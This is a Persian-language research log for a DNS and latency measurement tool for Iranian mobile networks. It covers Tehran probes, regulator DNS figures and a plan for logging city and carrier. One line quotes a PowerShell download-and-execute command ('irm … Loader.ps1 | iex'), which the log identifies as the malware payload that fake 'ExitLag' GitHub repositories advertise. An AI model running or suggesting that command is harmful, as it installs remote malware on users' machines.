منابع داده: GitHub REST API (۲۲ جست‌وجو، ~۲۳۵ ریپوی یکتا، ۴۱ ریپو با خواندن کامل README)،
Globalping API (اندازه‌گیری واقعی از داخل ایران)، RIPEstat (تأیید ASN)، گزارش‌های رگولاتوری، ویکی‌پدیا (PLMN).

## ۱. سه کشف مهم این دور

1. **پروب‌های ایران در Globalping** — ۶ پروب فعال در تهران. برای اولین بار توانستیم
   **از داخل ایران** DNS و پینگ اندازه بگیریم، بدون نیاز به دستگاه کاربر.
   (همه datacenter هستند، نه خط موبایل — این محدودیت صادقانه ثبت می‌شود.)
2. **دو پروژهٔ ۲۵۰+ ستاره «ExitLag» در گیت‌هاب، بدافزارند** — README فقط دستور
   `irm https://shellx.click/powershell/Loader.ps1 | iex` را تبلیغ می‌کند (لودر PowerShell، بدون هیچ کد).
3. **اطلاعات رسمی رگولاتوری موجود است** — RTT و DNS-response-time هر اپراتور،
   و هر سه اپراتور از حد مجاز خودِ رگولاتوری برای DNS (۱۳۲.۶۸ms) بالاترند.

### طرح «ثبت شهر + اپراتور» (اجرا نشده — منتظر دستور)
- **سمت ورکر (خودکار، بدون API بیرونی):** `request.cf` → `asn`, `asOrganization`, `city`,
  `region`, `regionCode`, `latitude/longitude`, `timezone`, `colo`, `clientTcpRtt`.
- **سمت اپ:** `TelephonyManager` نام اپراتور را دقیق می‌دهد؛ ولی شهر از روی IP تقریبی است
  (CGNAT موبایل معمولاً به‌نام مرکز استان ثبت می‌شود) → **شهر با یک انتخاب یک‌باره از کاربر**
  (فهرست استان‌ها/شهرها) + اپراتور خودکار.
- **ثبت:** هر اندازه‌گیری در KV با `{ts, city, carrier, asn, colo, resolver, ms, ok}` ذخیره شود
  → ساخت اولین مجموعه‌دادهٔ واقعی «خطوط ایرانی».
- **صداقت:** «بهترین DNS تهران» وجود ندارد؛ بهترین = اندازه‌گیری روی خط خودت.
  شهر/اپراتور فقط برای **گروه‌بندی و پیشنهاد کاندید** به کار می‌رود، نه توصیهٔ قطعی­.
- **منبع سوم:** Globalping (پروب‌های تهران) به‌عنوان نقطهٔ سنجش داخلی، در کنار سنجش خط کاربر.
